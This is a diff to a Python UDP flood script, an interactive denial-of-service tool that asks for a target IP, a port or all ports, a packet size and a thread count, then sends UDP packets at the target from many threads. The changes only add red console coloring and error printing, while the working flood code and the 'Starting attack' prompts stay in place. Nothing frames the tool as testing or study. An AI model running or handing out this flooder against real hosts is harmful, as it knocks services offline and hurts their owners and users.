@@ -4,7 +4,7 @@ import os
 from random import randint
 from time import time, sleep
 from getpass import getpass as hinput
-
+from pystyle import Colors
 
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -35,8 +35,8 @@ class UDPFlooder:
             try:
                 self.client.sendto(self.packet_data, (self.ip, self._get_random_port()))
                 self.sent_bytes += self.packet_length
-            except:
-                pass
+            except Exception as e:
+                print(f"{Colors.red}Error sending packet: {e}{Colors.reset}")
 
     def _get_random_port(self):
         return self.port if self.port else randint(1, 65535)
@@ -51,7 +51,7 @@ class UDPFlooder:
             if current_time - start_time >= 1:
                 speed_mbps = self.sent_bytes * 8 / (1024 * 1024) / (current_time - start_time)
                 total_bytes_sent += self.sent_bytes
-                print(f"Speed: {speed_mbps:.2f} Mb/s - Total: {total_bytes_sent / (1024 * 1024 * 1024):.2f} Gb", end='\r')
+                print(f"{Colors.red}Speed: {speed_mbps:.2f} Mb/s - Total: {total_bytes_sent / (1024 * 1024 * 1024):.2f} Gb{Colors.reset}", end='\r')
                 start_time = current_time
                 self.sent_bytes = 0
 
@@ -62,30 +62,30 @@ def get_input(prompt, default=None, cast_type=int):
     try:
         return cast_type(value)
     except ValueError:
-        print(f"Invalid input. Please enter a valid {cast_type.__name__}.")
+        print(f"{Colors.red}Invalid input. Please enter a valid {cast_type.__name__}.{Colors.reset}")
         return get_input(prompt, default, cast_type)
 
 def main():
     clear_screen()
-    ip = input("Enter the target IP address: ")
+    ip = input(f"{Colors.red}Enter the target IP address: {Colors.reset}")
     if not ip.count('.') == 3:
-        print("Error! Please enter a valid IP address.")
+        print(f"{Colors.red}Error! Please enter a valid IP address.{Colors.reset}")
         return
 
-    port = get_input("Enter the target port (or press enter to target all ports): ", default=None, cast_type=int)
-    packet_size = get_input("Enter the packet size in bytes (default is 1250): ", default=1250)
-    thread_count = get_input("Enter the number of threads (default is 100): ", default=100)
+    port = get_input(f"{Colors.red}Enter the target port (or press enter to target all ports): {Colors.reset}", default=None, cast_type=int)
+    packet_size = get_input(f"{Colors.red}Enter the packet size in bytes (default is 1250): {Colors.reset}", default=1250)
+    thread_count = get_input(f"{Colors.red}Enter the number of threads (default is 100): {Colors.reset}", default=100)
 
     flooder = UDPFlooder(ip, port, packet_size, thread_count)
     
     try:
         flooder.start_flood()
-        print(f"Starting attack on {ip}:{port if port else 'all ports'}")
+        print(f"{Colors.red}Starting attack on {ip}:{port if port else 'all ports'}{Colors.reset}")
         while True:
             sleep(1000000)
     except KeyboardInterrupt:
         flooder.stop_flood()
-        print(f"Attack stopped. Total data sent: {flooder.sent_bytes / (1024 * 1024 * 1024):.2f} Gb")
+        print(f"{Colors.red}Attack stopped. Total data sent: {flooder.sent_bytes / (1024 * 1024 * 1024):.2f} Gb{Colors.reset}")
 
 if __name__ == '__main__':
     main()
